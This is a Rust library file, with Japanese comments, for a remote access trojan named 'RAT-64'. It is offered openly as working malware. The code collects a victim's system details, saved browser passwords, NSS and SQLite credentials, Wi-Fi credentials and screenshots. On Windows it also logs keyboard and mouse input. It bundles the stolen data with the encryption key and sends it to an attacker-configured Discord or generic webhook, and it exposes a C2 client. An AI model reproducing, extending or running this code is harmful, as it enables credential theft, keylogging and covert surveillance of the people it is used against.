// RAT-64 Library - 整理されたモジュール構造版
use serde::{Serialize, Deserialize};

// カスタムエラー型の定義
#[derive(Debug)]
pub enum RatError {
    Io(std::io::Error),
    Serialization(serde_json::Error),
    Encryption(String),
    Command(String),
    Config(String),
}

impl std::fmt::Display for RatError {
    fn fmt(&self, f: &mut std::fmt::Formatter) -> std::fmt::Result {
        match self {
            RatError::Io(err) => write!(f, "I/O error: {}", err),
            RatError::Serialization(err) => write!(f, "Serialization error: {}", err),
            RatError::Encryption(msg) => write!(f, "Encryption error: {}", msg),
            RatError::Command(msg) => write!(f, "Command error: {}", msg),
            RatError::Config(msg) => write!(f, "Configuration error: {}", msg),
        }
    }
}

impl std::error::Error for RatError {}

impl From<std::io::Error> for RatError {
    fn from(err: std::io::Error) -> Self {
        RatError::Io(err)
    }
}

impl From<serde_json::Error> for RatError {
    fn from(err: serde_json::Error) -> Self {
        RatError::Serialization(err)
    }
}

pub type RatResult<T> = Result<T, RatError>;

// 整理されたモジュールシステム
pub mod core;        // 基本設定とコア機能
pub mod collectors;  // データ収集機能
pub mod network;     // ネットワーク通信機能
pub mod utils;       // ユーティリティ機能
pub mod services;    // バックグラウンドサービス機能

// modulesディレクトリは削除済み（新しいモジュール構造を使用）

// 公開API（新しいモジュール構造に対応）
pub use core::{Config, load_config_or_default};
pub use collectors::{
    SystemInfo, get_system_info, get_system_info_async, DiskInfo, NetworkInterface,
    AuthData, collect_auth_data_with_config,
    ScreenshotData, collect_screenshots,
    get_profile_path, get_default_profile,
    JsonCredentials, SqliteCredentials, NssCredentials, DecryptedLogin
};
pub use utils::{encrypt_data_with_key, generate_key_pair};
pub use network::{UploadResult, UploadError, Uploader, upload_data_file, upload_multiple};
pub use services::{C2Client};

// メイン実行機能
pub async fn execute_rat_operations(config: &Config) -> RatResult<String> {
    let mut results = Vec::new();
    
    // システム情報収集
    match get_system_info_async().await {
        Ok(system_info) => {
            results.push(format!("✅ システム情報収集成功: {}", system_info.hostname));
        }
        Err(e) => {
            results.push(format!("❌ システム情報収集失敗: {}", e));
        }
    }
    
    // 認証データ収集
    let auth_data = collect_auth_data_with_config(config);
    results.push(format!("✅ 認証データ収集: {}件のパスワード", auth_data.passwords.len()));
    
    // スクリーンショット収集
    if config.collect_screenshots {
        let screenshot_data = collect_screenshots(config);
        results.push(format!("✅ スクリーンショット収集: {}件", screenshot_data.total_count));
    }
    
    Ok(results.join("\n"))
}

// 統合データペイロード作成
#[derive(Serialize, Deserialize, Debug)]
pub struct IntegratedPayload {
    pub system_info: SystemInfo,
    pub auth_data: AuthData,
    pub screenshot_data: Option<ScreenshotData>,
    pub input_events: Option<Vec<String>>,    // 入力イベントログ
    pub timestamp: String,
    pub session_id: String,
    pub encryption_key: Option<String>,  // Base64エンコードされた暗号化キー
    pub encryption_nonce: Option<String>, // Base64エンコードされたノンス
}

impl IntegratedPayload {
    pub async fn create_with_config(config: &Config) -> RatResult<Self> {
        let system_info = get_system_info_async().await?;
        let auth_data = collect_auth_data_with_config(config);
        let screenshot_data = if config.collect_screenshots {
            Some(collect_screenshots(config))
        } else {
            None
        };
        // 入力イベント（Windowsのみ、3秒サンプリング）
        #[cfg(windows)]
        let input_events = {
            use crate::collectors::key_mouse_logger::collect_input_events_for;
            tokio::task::spawn_blocking(|| collect_input_events_for(3000)).await.ok()
        };
        #[cfg(not(windows))]
        let input_events = None;

        Ok(IntegratedPayload {
            system_info,
            auth_data,
            screenshot_data,
            input_events,
            timestamp: chrono::Utc::now().to_rfc3339(),
            session_id: uuid::Uuid::new_v4().to_string(),
            encryption_key: None,    // 後で設定
            encryption_nonce: None,  // 後で設定
        })
    }
    
    // キーとノンスを設定するメソッド
    pub fn set_encryption_info(&mut self, key: &[u8; 32], nonce: &[u8; 12]) {
        self.encryption_key = Some(base64::Engine::encode(&base64::engine::general_purpose::STANDARD_NO_PAD, key));
        self.encryption_nonce = Some(base64::Engine::encode(&base64::engine::general_purpose::STANDARD_NO_PAD, nonce));
    }
}


// Webhook送信（統合版）
pub async fn send_unified_webhook(payload: &IntegratedPayload, config: &Config) -> RatResult<()> {
    if !config.webhook_enabled {
        return Ok(());
    }
    if config.webhook_url.trim().is_empty() {
        return Ok(());
    }

    match config.webhook_type.as_str() {
        "Discord" => send_discord_webhook(payload, config).await,
        _ => send_generic_webhook(payload, config).await,
    }
}

async fn send_discord_webhook(payload: &IntegratedPayload, config: &Config) -> RatResult<()> {
    use serde_json::json;

    let public_ip = payload.system_info.public_ip.as_deref().unwrap_or("不明");
    let password_count = payload.auth_data.passwords.len();
    let wifi_count = payload.auth_data.wifi_creds.len();
    let screenshot_count = payload.screenshot_data.as_ref().map(|s| s.total_count).unwrap_or(0);

    let embed = json!({
        "title": format!("🔥 RAT-64 データ収集 - {}", payload.system_info.hostname),
        "color": 0x00ff00,
        "fields": [
            {
                "name": "💻 システム情報",
                "value": format!("**ホスト名**: {}\n**ユーザー**: {}\n**OS**: {} {}\n**CPU**: {}\n**RAM**: {:.1}GB / {:.1}GB\n**仮想マシン**: {}",
                    payload.system_info.hostname,
                    payload.system_info.username,
                    payload.system_info.os_name,
                    payload.system_info.os_version,
                    payload.system_info.cpu_info,
                    payload.system_info.memory_available_gb,
                    payload.system_info.memory_total_gb,
                    if payload.system_info.is_virtual_machine {
                        payload.system_info
                            .virtual_machine_vendor
                            .as_deref()
                            .unwrap_or("はい")
                    } else {
                        "いいえ"
                    }
                ),
                "inline": false
            },
            {
                "name": "🌐 ネットワーク情報", 
                "value": format!("**ローカルIP**: {}\n**グローバルIP**: {}\n**タイムゾーン**: {}",
                    payload.system_info.local_ip,
                    public_ip,
                    payload.system_info.timezone
                ),
                "inline": false
            },
            {
                "name": "📊 収集データ",
                "value": format!("**パスワード**: {}件\n**WiFi認証情報**: {}件\n**スクリーンショット**: {}件",
                    password_count,
                    wifi_count,
                    screenshot_count
                ),
                "inline": false
            },
            {
                "name": "🔐 暗号化情報",
                "value": format!("**キー**: {}\n**ノンス**: {}",
                    payload.encryption_key.as_deref().unwrap_or("未設定"),
                    payload.encryption_nonce.as_deref().unwrap_or("未設定")
                ),
                "inline": false
            }
        ],
        "footer": {
            "text": format!("収集時刻: {} | セッションID: {}", 
                payload.timestamp, 
                payload.session_id.chars().take(8).collect::<String>()
            )
        }
    });

    let webhook_payload = json!({
        "embeds": [embed]
    });

    let body = serde_json::to_string(&webhook_payload)?;
    send_json_webhook(&config.webhook_url, body, "Discord Webhook", config.timeout_seconds).await
}

async fn send_generic_webhook(payload: &IntegratedPayload, config: &Config) -> RatResult<()> {
    let body = serde_json::to_string(payload)?;
    send_json_webhook(&config.webhook_url, body, "Generic Webhook", config.timeout_seconds).await
}

async fn send_json_webhook(url: &str, body: String, context: &str, timeout_seconds: u64) -> RatResult<()> {
    let url_owned = url.to_owned();
    let context_owned = context.to_owned();
    let join_context = context_owned.clone();

    let response_result = tokio::task::spawn_blocking(move || {
        let mut req = minreq::post(url_owned)
            .with_header("Content-Type", "application/json")
            .with_body(body);
        if timeout_seconds > 0 {
            req = req.with_timeout(timeout_seconds);
        }
        req.send()
    })
    .await
    .map_err(|e| RatError::Command(format!("{} Webhook送信スレッドエラー: {}", join_context, e)))?;

    let request_context = context_owned.clone();
    let response = response_result
        .map_err(|e| RatError::Command(format!("{} Webhook送信エラー: {}", request_context, e)))?;

    if !(200..=299).contains(&response.status_code) {
        return Err(RatError::Command(format!("{} Webhook送信失敗: {}", context_owned, response.status_code)));
    }

    Ok(())
}

// ユーティリティ関数
pub fn get_local_ip() -> Option<String> {
    crate::collectors::system_info::get_primary_local_ip()
}
// 全ての必要な依存関係は既に追加済み
